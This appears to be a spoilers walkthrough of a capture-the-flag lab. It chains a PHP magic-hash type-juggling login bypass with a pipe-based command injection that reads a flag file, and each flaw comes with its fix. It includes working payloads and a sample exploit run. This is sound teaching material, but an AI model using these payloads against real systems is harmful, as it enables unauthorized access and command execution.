# Walkthrough — Looking Glass  (SPOILERS)

**Chain:** PHP type-juggling authentication bypass → authenticated command injection → RCE → flag.

## 1. Read the source

Four files. The interesting decisions are in two of them.

`config.php`:
```php
$ADMIN_USER = 'netadmin';
$ADMIN_PASS_HASH = '0e830400451993494058024219903391';
```

`index.php`:
```php
if ($user === $ADMIN_USER && md5($pass) == $ADMIN_PASS_HASH) { /* login */ }
```

Two observations:
- The username uses strict `===`, so it must be exactly `netadmin` (and it's right there in the source).
- The password uses loose `==` against an MD5 hash that **starts with `0e`**.

## 2. Authentication bypass — the magic hash

PHP's `==` performs type juggling. When both operands are strings that look like scientific notation —
`0e` followed by only digits — PHP converts them to the float `0`. So:

```
"0e830400451993494058024219903391" == "0e462097431906509019562988736854"   // 0 == 0  → true
```

We don't know the real password. We don't need it. We need **any** input whose MD5 is also `0e` + only
digits. The classic example:

```
md5("240610708") = "0e462097431906509019562988736854"
```

Log in with `netadmin` / `240610708`. The two magic hashes both juggle to `0`, the comparison passes,
and we have an operator session. **Fix:** use `===` (strict) and a real password hashing API
(`password_hash`/`password_verify`).

## 3. Command injection — the leaky filter

`admin.php` runs a reachability probe:
```php
$target = str_replace([';', '&', '`'], '', $target);
$output = shell_exec('ping -c 1 ' . $target . ' 2>&1');
```

The filter is a blacklist, and it's incomplete. It removes `;`, `&` and the backtick — but not the
**pipe** `|` (nor `$(...)`). User input lands directly in a shell command. So:

```
target = 127.0.0.1 | cat /flag.txt
```

becomes:
```
ping -c 1 127.0.0.1 | cat /flag.txt 2>&1
```

`cat /flag.txt` runs regardless of the ping result, and its output is echoed back on the page.
**Fix:** never build a shell string from input — use `escapeshellarg()`, or avoid the shell entirely
with `exec()`-style argument arrays. Blacklists of metacharacters are not a defence.

## 4. One-click exploit

`exploit/exploit.py` performs both steps: it authenticates with the magic-hash password, keeps the
session cookie, sends the piped injection, and scrapes `FLAG{...}` from the response.

```
$ python3 exploit/exploit.py http://127.0.0.1:8081
[+] auth bypass OK  (magic-hash password: 240610708)
[+] RCE OK          (payload: 127.0.0.1 | cat /flag.txt)
[+] FLAG: FLAG{typ3_juggl1ng_into_a_l34ky_p1pe}
```

## Takeaways
- `==` vs `===` is a security boundary in PHP. Loose comparison + an `0e` hash = auth bypass.
- Metacharacter blacklists for shell commands are always bypassable. Use argument arrays / escaping.
- The exam skill is turning two source-code observations into a single automated exploit script.
